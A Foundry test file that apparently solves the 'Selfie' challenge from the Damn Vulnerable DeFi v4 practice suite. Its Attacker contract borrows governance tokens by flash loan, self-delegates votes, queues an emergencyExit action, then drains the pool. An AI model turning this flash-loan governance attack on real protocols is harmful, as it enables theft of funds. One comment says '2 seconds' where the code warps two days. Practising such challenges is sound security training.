// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(governance, pool, recovery, token);
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attacker is Test, IERC3156FlashBorrower {
    SimpleGovernance internal governance;
    SelfiePool internal pool;
    address internal recovery;
    DamnValuableVotes internal token;

    uint256 internal actionId;

    constructor(SimpleGovernance _governance, SelfiePool _pool, address _recovery, DamnValuableVotes _token) {
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
        token = _token;
    }

    function attack() public {
        // Set the flash loan, which will make us able to enqueue the withdrawal
        // at the callback
        pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "");

        // Move 2 seconds in the future
        vm.warp(block.timestamp + 2 days);

        // Execute the enqueue call
        governance.executeAction(actionId);

        // Send the funds to the recovery accound
        token.transfer(recovery, token.balanceOf(address(this)));
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
        external
        returns (bytes32)
    {
        // We have to delegate to ourselves if we want to participate
        // in the voting procedure
        token.delegate(address(this));

        // Enqueue the withdrawal
        bytes memory data = abi.encodeWithSelector(pool.emergencyExit.selector, address(this));
        actionId = governance.queueAction(address(pool), 0, data);

        // Approve to give the money back
        token.approve(address(pool), amount);

        // Comply with the interface
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
